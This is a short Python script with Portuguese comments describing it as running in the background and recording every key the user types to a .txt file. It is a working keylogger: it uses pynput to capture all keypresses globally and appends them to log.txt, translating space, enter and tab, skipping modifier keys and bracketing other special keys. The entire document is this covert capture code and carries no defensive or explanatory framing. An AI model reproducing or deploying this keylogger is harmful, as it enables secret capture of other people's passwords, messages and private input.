#1 - Eecução em segundo plano
#2 - Toda vez que o usuário digitar uma tecla será gravado em .txt

from pynput import keyboard

IGNORAR ={keyboard.Key.esc,
          keyboard.Key.shift,
          keyboard.Key.shift_r,
          keyboard.Key.shift_l,
          keyboard.Key.ctrl,
          keyboard.Key.ctrl_r,
          keyboard.Key.ctrl_l, 
          keyboard.Key.alt, 
          keyboard.Key.alt_r, 
          keyboard.Key.alt_l
}

def on_press(key):
    try:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}]")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

